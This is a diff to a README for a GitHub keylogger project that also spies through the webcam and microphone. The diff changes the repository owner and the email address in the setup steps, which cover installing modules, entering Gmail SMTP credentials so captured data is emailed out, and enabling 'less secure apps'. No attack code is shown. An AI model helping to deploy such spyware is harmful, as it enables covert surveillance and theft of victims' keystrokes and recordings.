@@ -1,11 +1,11 @@
 ## Installation & Running of this Keylogger
 1. [Download Python](https://www.python.org/downloads/) and [Install](https://www.w3schools.in/python-tutorial/install/) it.
-2. Make sure all the associated modules are installed. I've added all the modules in the [requirements.txt](https://github.com/rohitb6/Advanced-Keylogger-with-Webcam-and-Microphone-Spy/blob/main/requirements.txt) file.
+2. Make sure all the associated modules are installed. I've added all the modules in the [requirements.txt](https://github.com/Medhaa8/Advanced-Keylogger-with-Webcam-and-Microphone-Spy/blob/main/requirements.txt) file.
 3. If any of the module is not in the requirements.txt file then open Command Prompt & type
 ```
 pip install ModuleName
 ```
-5. At **line 23** in the main file enter your full email instead of rohitbarik48@gmail.com.
+5. At **line 23** in the main file enter your full email instead of medhaacharya248@gmail.com.
 6. At **line 25** in the main file enter the password for that email smpt
 7. Make sure in the gmail account settings that the [allow less secure apps](https://support.google.com/accounts/answer/6010255?hl=en#zippy=%2Cif-less-secure-app-access-is-on-for-your-account) is on.
 8. Open up a Command Prompt and Change to the directory the program is placed and execute the [importos.py](https://github.com/Medhaa8/Advanced-Keylogger-with-Webcam-and-Microphone-Spy/blob/main/import%20os.py) file.
